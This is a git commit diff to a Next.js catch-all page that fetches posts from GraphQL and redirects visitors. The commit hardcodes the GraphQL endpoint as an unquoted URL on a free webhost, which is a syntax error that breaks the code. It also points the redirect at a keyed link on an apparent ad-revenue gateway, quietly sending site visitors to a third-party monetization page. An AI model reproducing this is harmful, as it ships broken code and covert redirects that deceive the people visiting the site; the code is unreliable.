e319d2b6e2fae24d2ec5024ea124d6e4b3f59685
Shoukat010100 <134385276+Shoukat010100@users.noreply.github.com>
2023-05-23 15:49:02 +0500

    Update [...postpath].tsx

--- Pages/[...postpath].tsx
+++ Pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = https://trytooi.000webhostapp.com/graphql;
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/rq7vriiicp?key=067aeb59c18921990f25a92ec80e49e3/`
 				}`,
 			},
 		};
